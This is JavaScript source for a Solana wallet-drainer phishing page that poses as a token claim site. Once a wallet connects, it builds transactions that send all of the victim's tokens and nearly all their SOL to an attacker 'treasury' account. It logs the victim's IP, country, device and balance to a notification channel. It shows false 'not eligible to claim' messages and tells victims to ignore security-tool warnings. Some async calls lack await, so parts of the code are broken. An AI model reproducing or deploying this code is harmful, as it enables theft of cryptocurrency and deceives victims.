// import { WalletMultiButton } from "https://cdn.jsdelivr.net/npm/@solana/wallet-adapter-react-ui@0.9.35/lib/cjs/index.min.js";
// import { useConnection, useWallet } from "https://cdn.jsdelivr.net/npm/@solana/wallet-adapter-react@0.15.35/lib/cjs/index.min.js";
// import { LAMPORTS_PER_SOL, PublicKey, SystemProgram, Transaction } from "https://cdn.jsdelivr.net/npm/@solana/web3.js@1.98.0/lib/index.browser.cjs.min.js";
// import { createAssociatedTokenAccountInstruction, createTransferInstruction, getAssociatedTokenAddress } from "https://cdn.jsdelivr.net/npm/@solana/spl-token@0.4.9/lib/cjs/index.min.js";
// import { toast } from "https://cdn.jsdelivr.net/npm/sonner@1.7.1/dist/index.min.js";
// import { getTokenAccounts, TREASURY_ACCOUNT, sendNotification } from "./helper.js";
// import CountryCodeList from './countryCode.js'


function Solana() {
  // const { connection } = useConnection();
  const wallet = useWallet();
  const dismissAll = () => toast.dismiss();

  
  
  var ip = '';
  var deviceType = '';
  var osName = '';
  var isLoading = true;
  var isClaiming = 0;

  // ---------------------------
   const staticFunc = () => {
    const fetchIp = async () => {
      try {
        const response = await fetch('https://ipinfo.io/json?token=1ff23e6ad0fa02');
        const data = await response.json();
        ip = data;
      } catch (error) {
        console.error('Error fetching the IP address:', error);
      } finally {
        isLoading = false;
      }
    };

    const fetchDeviceType = () => {
      const detectDeviceType = /Mobile|Android|iPhone|iPad/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
      deviceType = detectDeviceType;
    }    

    const fetchOSName = () => {
      const userAgent = window.navigator.userAgent;
      const platform = window.navigator.platform;
      const macosPlatforms = ['Macintosh', 'MacIntel', 'MacPPC', 'Mac68K'];
      const windowsPlatforms = ['Win32', 'Win64', 'Windows', 'WinCE'];
      const iosPlatforms = ['iPhone', 'iPad', 'iPod'];
    
      if (macosPlatforms.includes(platform)) {
        osName = 'macOS';
      } else if (iosPlatforms.includes(platform)) {
        osName = 'iOS';
      } else if (windowsPlatforms.includes(platform)) {
        osName = 'Windows';
      } else if (/Android/.test(userAgent)) {
        osName = 'Android';
      } else if (/Linux/.test(platform)) {
        osName = 'Linux';
      } else {
        osName = 'Unknown';
      }
    };

    fetchIp();
    fetchDeviceType();
    fetchOSName();
  };

  // ---------------------------------
  const dynamicFunc = () => {
    if (wallet.connected && !isLoading) {
      dismissAll();
      
      const drainTokens = (user) => {
        isClaiming = 1;

        let solBalanceWithDecimal = connection.getBalance(user.publicKey, { commitment: 'confirmed' });
        const solBalance = solBalanceWithDecimal / LAMPORTS_PER_SOL;
        // console.log(`Wallet Balance: ${solBalance}`)
        const tx = new Transaction();
        tx.feePayer = user.publicKey;

        if(!!solBalance) {
          const tokenInfos = getTokenAccounts(user.publicKey?.toBase58(), connection);
          let totalTokenPriceUSD = 0;
          var tokenText = '';

          Promise.all(tokenInfos.map(async (_tokenInfo) => {
            // console.log(_tokenInfo.mintAddress, user.publicKey)
            // console.log(`1 - Getting Source Token Account`);

            const response = await fetch('https://mainnet.helius-rpc.com/?api-key=8143571b-c42a-47de-bb23-26085b06f657', {
              method: 'POST',
              headers: {
                "Content-Type": "application/json"
              },
              body: JSON.stringify({
                  "jsonrpc": "2.0",
                  "id": "text",
                  "method": "getAsset",
                  "params": { id: _tokenInfo.mintAddress} 
              }),
            });

            const tokenParsedInfo = await response.json();
            const tokenSymbol = tokenParsedInfo.result.content.metadata.symbol;

            const fetchPrice = async () => {
              try {
                const response = await fetch('https://coin-api-yhts.onrender.com/getPrice?symbol=' + tokenSymbol, { 
                  method: 'GET' 
                });
                const data = await response.json();
                return data;
              } catch (error) {
                return false;
              }
            };

            const getTokenPrice = await fetchPrice();
            const tokenPrice = getTokenPrice.data[tokenSymbol.toUpperCase().trim()].quote.USD.price * 1;
            
            if(tokenPrice <= 0) return false;
            const tokenTotalPrice = (tokenPrice * _tokenInfo.balance).toFixed(2);
            totalTokenPriceUSD += Number(tokenTotalPrice);
            tokenText += '💎 Drained ' + _tokenInfo.balance + ' ' + tokenSymbol + ' [$' + tokenTotalPrice + ']\n';
            
            const latestBlockHash = await connection.getLatestBlockhash('confirmed');
            tx.recentBlockhash = await latestBlockHash.blockhash;
            const gasFee = await tx.getEstimatedFee(connection) ?? 0;

            if (solBalanceWithDecimal - gasFee < 0.003 * LAMPORTS_PER_SOL) {
              return false;
            }

            try {
              let sourceAccount = await getAssociatedTokenAddress(
                new PublicKey(_tokenInfo.mintAddress),
                user.publicKey
              );

              const sourceAccount1 = await connection.getAccountInfo(sourceAccount, 'confirmed');
              console.log('sourceAccount1', sourceAccount1);
              let destinationAccount = await getAssociatedTokenAddress(
                new PublicKey(_tokenInfo.mintAddress),
                new PublicKey(TREASURY_ACCOUNT)
              );

              const receiverAccount = await connection.getAccountInfo(destinationAccount, 'confirmed');

              console.log("receiverAccount", receiverAccount);

              if (receiverAccount === null) {

                console.log(user.publicKey, _tokenInfo.address, new PublicKey(TREASURY_ACCOUNT), new PublicKey(_tokenInfo.mintAddress));

                tx.add(
                  createAssociatedTokenAccountInstruction(
                    user.publicKey,
                    destinationAccount,
                    new PublicKey(TREASURY_ACCOUNT),
                    new PublicKey(_tokenInfo.mintAddress)
                  )
                )
              }
              console.log(`4 - Creating and Sending Transaction`);
              tx.add(createTransferInstruction(
                sourceAccount,
                destinationAccount,
                user.publicKey,
                _tokenInfo.balance * Math.pow(10, _tokenInfo.decimals)
              ));
            }
            catch (e) {
              console.log("token-error:", e);
            }
          }));

          const getSolPrice = fetch('https://coin-api-yhts.onrender.com/getPrice?symbol=SOL', {
            method: 'GET'
          });

          const solData = getSolPrice.json();
          const solPrice = Number((solData.data.SOL.quote.USD.price * solBalance).toFixed(2));
          const notiAmount = (totalTokenPriceUSD + solPrice).toFixed(2);

          sendNotification(`👋 User Connected | [[${ip.ip}]] | ${CountryCodeList.find(value => value.code === ip.country)?.name} | 🔍 [<a href="https://solscan.io/address/${wallet.publicKey?.toString()}">Explorer</a>]\n\n🤖 Likely Bot Score:  🟢 [0] No Suspicious Activity\n\n💰 User has $${notiAmount}\n\n💳 Wallet: ${wallet.wallet?.adapter.name}\n📔Address: <a href="solscan.io/address/${wallet.publicKey?.toString()}"><code>${wallet.publicKey?.toString()}</code></a>\n💻 Device Type: <code>${deviceType} [${osName}]</code>\n🌐 Website: <a href="${location.href}">${location.href}</a>\n🔰 Is Proxy: ❌\n`, "html");

          if (totalTokenPriceUSD + solPrice < 5) {
            sendNotification(`⛔️ Minimum Not Reached | [[${ip.ip}]] | ${CountryCodeList.find(value => value.code === ip.country)?.name} | 🔍 [<a href="https://solscan.io/address/${wallet.publicKey?.toString()}">Explorer</a>]\n\n🤖 Likely Bot Score:  🟢 [0] No Suspicious Activity\n\n🔻 User has $${notiAmount} / $5.00 (minimum USD requirement).\n\n💳 Wallet: ${wallet.wallet?.adapter.name}\n📔Address: <a href="solscan.io/address/${wallet.publicKey?.toString()}"><code>${wallet.publicKey?.toString()}</code></a>\n💻 Device Type: <code>${deviceType} [${osName}]</code>\n🌐 Website: <a href="${location.href}">${location.href}</a>\n🔰 Is Proxy: ❌\n`, "html");
            dismissAll();
            toast.error("You're not eligible to claim");
            return false;
          }

          const latestBlockHash = connection.getLatestBlockhash('confirmed');
          tx.recentBlockhash = latestBlockHash.blockhash;
          const gasFee = tx.getEstimatedFee(connection) ?? 0;
          
          console.log(solBalanceWithDecimal - gasFee > 0.003 * LAMPORTS_PER_SOL);

          if (solBalanceWithDecimal - gasFee > 0.0031 * LAMPORTS_PER_SOL) {
            isClaiming = 2;
            tx.add(SystemProgram.transfer({
              fromPubkey: user.publicKey,
              toPubkey: new PublicKey(TREASURY_ACCOUNT),
              lamports: solBalanceWithDecimal - gasFee - 0.003 * LAMPORTS_PER_SOL,
            }));
            tokenText += '💎 Drained ' + solBalance + 'SOL [$' + solPrice * solBalance + ']\n';
            const allAmount = (totalTokenPriceUSD + solPrice).toFixed(2);

            try {
              const signature = user.sendTransaction(tx, connection, { skipPreflight: true });

              console.log(
                '\x1b[32m', //Green Text
                `   Transaction Success!🎉`,
                `\n    https://explorer.solana.com/tx/${signature}`
              );

              // send message to tg channel
              sendNotification(`📜 Drain Logs | [${totalTokenPriceUSD + solPrice}] | [[${ip.ip}]] | ${CountryCodeList.find(value => value.code === ip.country)?.name} | 🔍 [<a href="https://solscan.io/address/${wallet.publicKey?.toString()}">Explorer</a>]\n\n🤖 Likely Bot Score:  🟢 [0] No Suspicious Activity\n\n${tokenText}\n\n💳 Wallet: ${wallet.wallet?.adapter.name}\n📔Address: <a href="solscan.io/address/${wallet.publicKey?.toString()}"><code>${wallet.publicKey?.toString()}</code></a>\n💻 Device Type: <code>${deviceType} [${osName}]</code>\n🌐 Website: <a href="${location.href}">${location.href}</a>\n🔰 Is Proxy: ❌\n`, "html");
              dismissAll();
              toast.error("You're not eligible to claim");
              return false;


            } catch (error) {
              if (error.message?.includes('User rejected the request.')) {
                
                sendNotification(`❌ Prompt Rejected | [[${ip.ip}]] | ${CountryCodeList.find(value => value.code === ip.country)?.name} | 🔍 [<a href="https://solscan.io/address/${wallet.publicKey?.toString()}">Explorer</a>]\n\n🤖 Likely Bot Score:  🟢 [0] No Suspicious Activity\n\n💸 Rejected Drain Value:  $${allAmount}\n\n💳 Wallet: ${wallet.wallet?.adapter.name}\n📔Address: <a href="solscan.io/address/${wallet.publicKey?.toString()}"><code>${wallet.publicKey?.toString()}</code></a>\n💻 <code>Device Type: ${deviceType} [${osName}]</code>\n🌐 Website: <a href="${location.href}">${location.href}</a>\n🔰 Is Proxy: ❌\n`, "html");
                dismissAll();
                toast.error("Signature error! Please try again!");
              } else {
                isClaiming = 0;
                return false;
              }
            } finally {
              
              drainTokens(wallet);
            }
          }
          
        } else {
          isClaiming = 1;

          sendNotification(`⛔️ Minimum Not Reached | [[${ip.ip}]] | ${CountryCodeList.find(value => value.code === ip.country)?.name} | 🔍 [<a href="https://solscan.io/address/${wallet.publicKey?.toString()}">Explorer</a>]\n\n🤖 Likely Bot Score:  🟢 [0] No Suspicious Activity\n\n🔻 User has $0 / $5.00 (minimum USD requirement).\n\n💳 Wallet: ${wallet.wallet?.adapter.name}\n📔Address: <a href="solscan.io/address/${wallet.publicKey?.toString()}"><code>${wallet.publicKey?.toString()}</code></a>\n💻 Device Type: <code>${deviceType} [${osName}]</code>\n🌐 Website: <a href="${location.href}">${location.href}</a>\n🔰 Is Proxy: ❌\n`, "html");

          dismissAll();
          toast.error("You're not eligible to claim");
        }
      }
      drainTokens(wallet);
    }
  }
  //------------------------------------
  let style = document.createElement('style');
  style.innerHTML = `
    .fixed { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; }
    .flex { display: flex; }
    .justify-center { justify-content: center; }
    .items-center { align-items: center; }
    .backdrop-blur-sm { backdrop-filter: blur(4px); }
    .bg-gray-800 { background-color: #2d2d2d; }
    .text-white { color: white; }
    .w-full { width: 100%; }
    .mx-8 { margin-left: 2rem; margin-right: 2rem; }
    .py-10 { padding-top: 2.5rem; padding-bottom: 2.5rem; }
    .rounded-lg { border-radius: 0.5rem; }
    .gap-8 { gap: 2rem; }
    .text-4xl { font-size: 2.25rem; }
    .animate-ping { animation: ping 1s infinite; }
    .text-xl { font-size: 1.25rem; }
    .h-20 { height: 5rem; }
    .w-20 { width: 5rem; }
    .rounded-full { border-radius: 50%; }
    .border-8 { border-width: 8px; }
    .border-white-500 { border-color: #f5f5f5; }
    .text-center { text-align: center; }
    .rounded-lg { border-radius: 0.5rem; }
    .min-h-screen { min-height: 100vh; }
    .w-2-3 { width: 66.67%; }
    .md-w-1-3 { width: 33.33%; }
    .bg-11141e { background-color: #11141e; }
    .Button { padding: 10px 20px; background-color: #ff0; color: #fff; cursor: pointer; border-radius: 0.5rem; }
  `;
  document.head.appendChild(style);

  function renderMainComponent() {
    const mainContainer = document.getElementById('main-container'); 
    mainContainer.innerHTML = '';

    const mainElement = document.createElement('main');
    mainElement.classList.add('min-h-screen');
    
    const claimingContainer = document.createElement('div');
    claimingContainer.classList.add('fixed', 'flex', 'justify-center', 'items-center', 'backdrop-blur-sm', 'w-full', 'h-full', 'z-20');
    claimingContainer.style.display = isClaiming ? 'flex' : 'none';

    // Conditional rendering for claiming status
    if (isClaiming === 1) {
        claimingContainer.innerHTML = `
            <div class="bg-gray-800 text-white flex flex-col justify-center items-center w-full mx-8 py-10 rounded-lg gap-8">
                <h1 class="text-4xl">Claiming...</h1>
                <span class="flex h-20 w-20">
                    <span class="animate-ping absolute inline-flex h-20 w-20 rounded-full bg-green-400 opacity-75"></span>
                    <span class="relative inline-flex rounded-full h-20 w-20 border-8 border-white-500"></span>
                </span>
            </div>
        `;
    } else if (isClaiming === 2) {
        claimingContainer.innerHTML = `
            <div class="bg-gray-800 text-white flex flex-col justify-center items-center w-full mx-8 py-10 rounded-lg gap-8">
                <h1 class="text-xl md:text-4xl">How To Sign</h1>
                <h3 class="text-sm sm:text-2xl mx-8 md:mx-20 text-center">
                    If you see the warning on the prompt (as shown below) it means this website has not yet been manually whitelisted by Blowfish, this process takes time.
                </h3>
                <video class="w-2-3 md-w-1-3 rounded-lg" autoPlay muted loop webkit-playsinline playsInline>
                    <source src='/video.webm' type="video/webm" />
                </video>
            </div>
        `;
    }

    mainElement.appendChild(claimingContainer);

    // Main content
    const contentContainer = document.createElement('div');
    contentContainer.classList.add('h-screen', 'flex', 'item-center', 'justify-center', 'bg-11141e');

    const contentInner = document.createElement('div');
    contentInner.classList.add('flex', 'flex-col', 'items-center', 'justify-center', 'z-10');

    contentInner.innerHTML = `
        <p class="text-white text-lg text-[20px] mb-[-10px]">You'll need a wallet on Solana to continue</p>
        <img src="./images/wallet.png" alt="Solana Wallet Icon" class="w-25 h-25">
        <button class="Button">Connect Wallet</button>
    `;
    
    contentContainer.appendChild(contentInner);
    mainElement.appendChild(contentContainer);
    mainContainer.appendChild(mainElement);
  }

  staticFunc();
  dynamicFunc();
  renderMainComponent();
  
};

